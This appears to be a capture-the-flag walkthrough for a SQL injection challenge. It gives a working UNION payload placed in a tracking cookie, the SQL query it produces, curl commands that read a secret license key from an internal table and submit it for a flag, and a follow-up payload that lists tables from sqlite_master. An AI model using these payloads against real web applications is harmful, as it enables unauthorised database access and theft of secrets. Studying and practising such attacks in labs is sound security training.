Use a one-column `UNION` to graft the secret onto the banner query, and comment
out the trailing quote. Set your cookie to:

```
TrackingId=x' UNION SELECT license_key FROM internal_config-- -
```

That makes the server run:

```sql
SELECT banner FROM banners WHERE trackingid = 'x' UNION SELECT license_key FROM internal_config-- -'
```

`'x'` matches nothing, the `UNION` appends the `license_key`, and `-- -` kills the
dangling quote. The value (it looks like `LK_` followed by 40 hex characters)
appears in the banner area of the response.

Send it as a raw header — spaces and the single quote are fine in a cookie value:

```
curl -s http://TARGET/ -H "Cookie: TrackingId=x' UNION SELECT license_key FROM internal_config-- -"
```

Then submit what you recovered:

```
curl -s "http://TARGET/solve?license=LK_....."
```

A correct license returns `FLAG{...}` as plain text; a wrong one returns HTTP 402.
If you did not want to guess the table/column names, the same UNION channel reads
them first: `... UNION SELECT sql FROM sqlite_master WHERE type='table'-- -`.
